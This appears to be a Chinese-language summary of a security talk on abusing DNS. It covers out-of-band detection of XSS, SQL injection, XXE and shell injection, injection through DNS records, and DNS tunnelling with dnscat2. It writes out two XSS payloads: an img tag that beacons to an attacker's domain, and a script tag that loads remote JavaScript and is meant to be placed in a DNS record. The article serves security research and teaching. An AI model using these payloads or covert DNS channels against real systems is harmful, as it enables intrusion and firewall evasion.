# DNS: More than just names

from：[DNS: More than just names](https://docs.google.com/presentation/d/1HfXVJyXElzBshZ9SYNjBwJf_4MBaho6UcATTFwApfXw/preview?pli=1&sle=true#slide=id.p)

0x00 前言
-------

* * *

此文章讲得所有内容都是用的DNS本身设计的功能，但是没有想到可被利用的地方。

讨论的范围仅是利用DNS本身攻击。

所以不会讨论下面的DNS攻击，如：

> DNS污染 DNS错误配置（域传送等） DNSSec

等等

0x01 DNS是如何工作的
--------------

* * *

![enter image description here](http://drops.javaweb.org/uploads/images/a459ea6941d1279e4930d00ce3f0d73a766e57e4.jpg)

0x02 协议
-------

* * *

**DNS 类型**

有很多不同的记录类型，但是我们这次只关注A，AAAA，CNAME，MX和TXT记录。

A :: 获取一个IP地址

![enter image description here](http://drops.javaweb.org/uploads/images/72b4c0c1f5e90b1de3c369101b29c4fb5cb77c4b.jpg)

AAAA :: 获取一个IPv6地址

![enter image description here](http://drops.javaweb.org/uploads/images/b350777851d6cd6492e65446f2f6586f4a7ab823.jpg)

MX :: 邮箱服务器

![enter image description here](http://drops.javaweb.org/uploads/images/f058f8ea515a9a5dd3bb60479a09590b68cb47aa.jpg)

也有,

CNAME - 别名 TXT - 文本数据

别忘了： NB/NBSTAT - NetBIOS

数据包结构：

![enter image description here](http://drops.javaweb.org/uploads/images/7c9fed89a7628f112b7559e1977086128198acaf.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/6bc35e786fec8473f924246e932c7354228e9f48.jpg)

如果name是以一对“1”bit开头的，剩下的14bit说明实际域名所在位置相对DNS起始表示字段的偏移。

例如：如果name是“C0 0F”则表示 “使用出现偏移量为0x0F的名字。

详细解释可以参考：http://blog.csdn.net/twelvelee/article/details/6714115

当然，这可能指向自身，造成DNS客户机/服务器 无限循环。 :)

**反向DNS**

工作原理相同，但是有PTR的记录类型（特殊方法格式化ip地址）。

![enter image description here](http://drops.javaweb.org/uploads/images/946c6c33d485a8d7208c2d8f53ca67263e5d14af.jpg)

最终你可以甚至为任何你想要的。

这让我疑惑，什么是可信的？

![enter image description here](http://drops.javaweb.org/uploads/images/a53e84ef397d32b42dd8b36b6b322c1022934a54.jpg)

**侦查与DNS**

当遇到只能走dns的数据，其他的都被防火墙挡住的时候：

我拥有skullseclabs.org域名，所有的请求都通过*.skullseclabs.org转到我的DNS服务器。

**XSS**

当你插入的js代码在浏览者的浏览器中执行的时候，你如何知道呢？

如果user-agent内容会被插入执行，

```
<img src='http://ab12.skullseclabs.org/img.jpg'>

```

然后查看我的DNS服务器 ：

![enter image description here](http://drops.javaweb.org/uploads/images/a4475b9298caf26370b3579989c11e87ab3fddaa.jpg)

证明html代码被执行。

为什么我们关心呢？

因为，数据包看起来完全是正常的。 我们没有直接连接服务器，因此防火墙是不会知道的。

![enter image description here](http://drops.javaweb.org/uploads/images/44f1679c5351bad6c1903cd4c563e85bc0770763.jpg)

最后我们可以知道是或否有服务器想要连接，不需要成功连接，甚至不需要服务器尝试连接。我们还可以做什么呢？

想要知道谁给你发邮件？

非常简单用admin@abc123.skullseclabs.org

![enter image description here](http://drops.javaweb.org/uploads/images/e80d6f4ad6997376054b1f2010246a5ae4798231.jpg)

结论？可能什么都没有，或许能找到一个反垃圾邮件。

**SQL 注射**

两个可以执行DNS查询的SQL语句

![enter image description here](http://drops.javaweb.org/uploads/images/8d1cf6261b89cee626e33495bf6b51f0c636da7d.jpg)

![enter image description here](http://drops.javaweb.org/uploads/images/13af8b4c44bc08fe8de28a28af42fe7c737d5a4d.jpg)

**XXE 漏洞**

Google曾经给在他服务器上找到XXE漏洞的人支付了1W刀。

XXE能够让你读取系统的本地文件：

![enter image description here](http://drops.javaweb.org/uploads/images/6e9ea48e9b3c5f9748f4aa12533c2cd4bad46e85.jpg)

同时也可以请求远程服务器

![enter image description here](http://drops.javaweb.org/uploads/images/540fe69dd2e5f2430d958376eada8f79af56c0f7.jpg)

我们就有了一种探测XXE漏洞的一种方式：

![enter image description here](http://drops.javaweb.org/uploads/images/59b7b9d220e0fff3948caeb3964ade2d28b3298f.jpg)

即使存在防火墙，或者服务器限制严格一些文件不能读取，你仍然能够探测到XXE漏洞。

通过DNS直接获取数据不太可能，但是用来检测是否有漏洞是个很有效的办法。

**shell注入**

使用这种方法，很容易检测到shell的注入，适用与不同的平台上。

插入一个DNS查询：

![enter image description here](http://drops.javaweb.org/uploads/images/4acc634f4dac14d250427559ae238685678eccbb.jpg)

（适用于Windows，Linux，BSD）

有人想起来这个周的ShellShock吗？

![enter image description here](http://drops.javaweb.org/uploads/images/e1d4bd4a53b1585b4921ef769d7fe870a21cbd9e.jpg)

**Attack over DNS**

安全性就是边界。

受信任的数据在一边，不受信任的数据在了另外一边。

当你做了DNS查询，你又考虑到结果不可信吗？

看看下面代码有安全问题吗？

![enter image description here](http://drops.javaweb.org/uploads/images/d51a67a5faeeadd0f501d481d19bca96a3d7a10d.jpg)

把TXT记录改成如下，最终导致SQL注入：

![enter image description here](http://drops.javaweb.org/uploads/images/0051ede0dbcb9f637ede2f4245f4d92730b5ee95.jpg)

下面有一篇详细的DNS注入的writeup

https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns

下面是一个有效的CNAME，MX，TXT，PTR等记录（双引号和空格不允许）

```
<script/src='http://javaop.com/test-js.js'></script>

```

显然TXT记录可以做更多的事情。

在2010年的时候我测试三个访问最多的域名查询系统的时候全部都有这个漏洞

现在其中的一个仍然有此问题。

**DNS隧道**

![enter image description here](http://drops.javaweb.org/uploads/images/f03a90f7b792364894c9edd4e3addcf1dc831d7a.jpg)

如何传送数据呢？

![enter image description here](http://drops.javaweb.org/uploads/images/7edf354d9d8f7ad43dcbf03b7704396963a7f4ce.jpg)

来回的通信：

![enter image description here](http://drops.javaweb.org/uploads/images/c194cf62ba3fdbf2c6c75ff303b6d86d66c1fb0a.jpg)

实际的过程：

![enter image description here](http://drops.javaweb.org/uploads/images/212555610ab00b68de239dec4a11a1900b15fe9c.jpg)

作者自己还解决的一些压缩等问题，最后给出自己写的工具地址：

[https://github.com/iagox86/dnscat2](https://github.com/iagox86/dnscat2)